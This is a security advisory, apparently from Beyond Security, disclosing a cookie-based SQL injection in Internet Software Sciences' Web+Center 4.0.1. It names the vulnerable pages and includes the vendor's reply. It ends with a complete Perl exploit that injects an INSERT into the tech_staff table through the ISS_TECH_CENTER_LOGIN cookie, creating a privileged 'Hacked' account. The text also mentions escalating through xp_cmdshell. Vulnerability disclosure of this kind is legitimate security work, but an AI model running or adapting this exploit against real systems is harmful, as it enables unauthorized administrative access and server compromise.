*Internet Software Sciences's Web+Center SQL Injection*

 *Summary*
Internet Software Sciences's Web+Center is "A suite of web based
customer support applications including:
 * Customer+Center
 * Tech+Center
 * Business+Center
 * Pocket+Center".

The Web+Center does a good job of filtering out malicious content from
incoming user provided data (given via GET and POST requests), however
neglects to verify whether malicious data is entered via the Cookie
object. Due to this at least one exploitable SQL Injection vulnerability
that would allow an anonymous user to at the very least gain
administrative privileges to the Internet Software Sciences's Web+Center
product, at the worst case he will be able to get complete control over
(administrative privileges) the computer on which the Internet Software
Sciences's Web+Center is installed and utilize it to gain access to
other computers.

 *Details*
*Vulnerable Systems:*
 * Internet Software Sciences's Web+Center version 4.0.1

As a lot of pages use the Cookie object, but some require a user to
logon prior to been able to access the page, we have chosen to show the
vulnerability via the search.asp page found under the tech40 directory.

Other directories also contain such vulnerable pages, customer40's
DoCustomerOptions.asp one such example.

If we insert a malicious SQL statement to the Cookie object, we can
modify the 'tech_staff' table, and add a new user that will have the
permissions of as an operator (tech_level 6).

Depending on what other information is stored on the SQL server, and how
it was hardened we could obtain:
1) SQL's administrative username and password
2) Execute commands via MS SQL's extended procedure (xp_cmdshell)
3) Trick users into downloading Trojan horses (by providing them with
solutions for their Tickets) etc.

See the below exploit code demonstrating how we gain administrative
privileges to Internet Software Sciences's Web+Center, no special
information is required beside the hostname, and the path under which
the search.asp page can be located.

*Vendor response:*
/Our engineers has reviewed the security vulnerability and we are
working on a updated version of our cookie tech check code that will be
implemented in our next version. We had already planned to implement a
more modularized version of the tech security code, so it will be easy
to check for SQL injection strings in this new modularized code. Thanks
for pointing this out and to making our product more secure/.

*Testing Methodology:*
A few months ago Beyond Security built a new module for its Automated
Scanning Vulnerability Assessment engine to test web sites and web
applications for security vulnerabilities. This module adds the
capability to dynamically crawl through a web site and find
vulnerabilities in its dynamic pages.

This type of tool was considered to be different from the network VA
tools, but we at Beyond Security believe that these two types of tools
should be merged into one, and this is what made us incorporate the Web
Site Security Audit module to our Automated Scanning engine.

For a press release on this integration see:
http://www.beyondsecurity.com/press/2004/press10030402.htm
White paper on the first integrated network and web application
vulnerability scanner: http://www.beyondsecurity.com/webscan-wp.pdf

Our Automated Scanning engine equipped with the Web Site Security Audit
module did all the tests described in this advisory automatically.

*Exploit:*
#!/usr/bin/perl

use IO::Socket;
use strict;

my $host = $ARGV[0];
my $Path = $ARGV[1];

if (($#ARGV+1) < 2)
{
print "iss_helpdesk.pl host path\n";
exit(0);
}

my $remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host,
PeerPort => "80" );

unless ($remote) { die "cannot connect to http daemon on $host" }

my $sql = "; INSERT INTO tech_staff (tech_id, tech_password, tech_level,
first_name, last_name, availability, show_dispatch_flag) VALUES
('Hacked', 'Hacked', 6, 'Hacked', 'Hacked', 1, 1); --";

$sql =~s/([^a-zA-Z0-9])/uc sprintf("%%%02x",ord($1))/eg;

my $http = "GET /$Path/search.asp HTTP/1.1
Host: $host
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6)
Gecko/20040405 Firefox/0.8
Accept:
text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,*/*;q=0.1
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: close
Cookie: ISS_TECH_CENTER_LOGIN='+$sql;

";

print "HTTP: [$http]\n";
print $remote $http;
sleep(1);

while (<$remote>)
{
# print $_;
}
print "\n";

close($remote);

print "You can now logon using the tech username 'Hacked' with the
password 'Hacked'\n";

exit(0);

 *Additional information*
The information has been provided by Noam Rathaus 
